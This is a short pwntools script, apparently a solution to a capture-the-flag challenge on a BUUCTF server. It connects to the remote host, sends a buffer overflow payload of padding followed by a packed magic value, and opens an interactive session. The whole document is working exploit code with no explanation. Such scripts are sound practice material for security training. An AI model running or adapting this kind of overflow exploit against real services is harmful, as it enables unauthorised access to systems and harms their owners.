from pwn import *
context.log_level='debug'
p = remote('node3.buuoj.cn',27585)
#p = process('./pwn')
data = 0x41348000
payload = 'A'*0x2C + p64(data)
p.sendlineafter('number.',payload)
p.interactive()